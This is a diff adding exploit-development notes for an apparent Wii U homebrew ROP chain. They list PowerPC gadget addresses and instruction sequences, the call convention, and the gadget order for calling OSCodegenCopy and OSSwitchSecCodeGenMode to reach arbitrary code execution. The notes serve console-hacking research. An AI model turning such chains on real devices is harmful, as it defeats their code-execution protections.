@@ -1,0 +1,66 @@
+//sp logic
+lwz r0, x(r1) = 800100xx
+mtlr r0 	  = 7c0903a6
+blr 		  = 4e800020
+
+
+coreinit baseaddr = 0x0100_0000
+
+
+//goal: arbcodeexec
+(assumes CodeGenMode is RW- at beginning of our code exec)
+1. Hook OSCodegenCopy
+	setup r3 with destination address
+	setup r4 with source address
+	setup r5 with size
+	branch in to OSCodegenCopy
+2. OSSwitchSecCodeGenMode
+	setup r3 with flag = 0
+	branch in to OSSwitchSecCodeGenMode
+3. pivot in to HBM Loader -> Return to starting address
+	branch in to binary base address
+
+to quote MrBean35000vr : When handing parameters to methods, hand them in order starting in r3, max r12 (?) and return values come back in r3.
+
+
+For testing:
+
+Copy magicnumbers to codegen section
+throw OSFatal
+Check mem
+
+
+
+
+Gadgets:
+
+	LOAD_R5_STACK = 0x00024d04 + 0x8 = 0x00024d0c
+lwz r5, x(r1):
+0x00024d04 : stw r5, 8(r1) ; bl 0x24850 ; lwz r5, 8(r1) ; addi r1, r1, 0x10 ; mr r3, r5 ; lwz r4, 4(r1) ; mtlr r4 ; blr
+
+lwz r3, x(r1):
+0x001d1b1c : mr r3, r31 ; bl 0x3338c ; lwz r3, 0x14(r1) ; lwz r29, 0x1c(r1) ; lwz r0, 0x2c(r1) ; lwz r31, 0x24(r1) ; mtlr r0 ; lwz r30, 0x20(r1) ; addi r1, r1, 0x28 ; blr
+
+lwz r4, x(r1):
+0x0010c4f4 : lwz r4, 0x14(r1) ; stwu r3, 0x448(r12) ; stw r4, 4(r12) ; lwz r0, 0x1c(r1) ; mtlr r0 ; addi r1, r1, 0x18 ; blr
+
+	LOAD_END_REGISTERS = 0x000012e0 + 0xc = 0x000012ec
+
+loads r29/r30/r31: 
+0x000012e0 : subf. r31, r29, r31 ; add r30, r30, r29 ; bgt 0x12dc ; lwz r29, 0xc(r1) ; lwz r0, 0x1c(r1) ; lwz r30, 0x10(r1) ; mtlr r0 ; lwz r31, 0x14(r1) ; addi r1, r1, 0x18 ; blr
+
+	LOAD_R4_R3_FROM_R30_R29 = 0x000e6604 + 0xc = 0x000e6610
+
+moves r30->r4, r29->r3
+0x000e6604 : or r10, r12, r8 ; bdnz 0xe65dc ; mr r3, r29 ; mr r4, r30 ; lwz r29, 0xc(r1) ; lwz r31, 0x14(r1) ; lwz r30, 0x10(r1) ; addi r1, r1, 0x18 ; blr
+
+
+order:
+	LOAD_R5_STACK
+	LOAD_END_REGISTERS
+	LOAD_R4_R3_FROM_R30_R29
+	(branch in to OSCodegenCopy)
+	LOAD_END_REGSITERS
+	LOAD_R4_R3_FROM_R30_R29
+	(branch in to OSSwitchSecCodeGenMode)
+	(branch in to target code!)
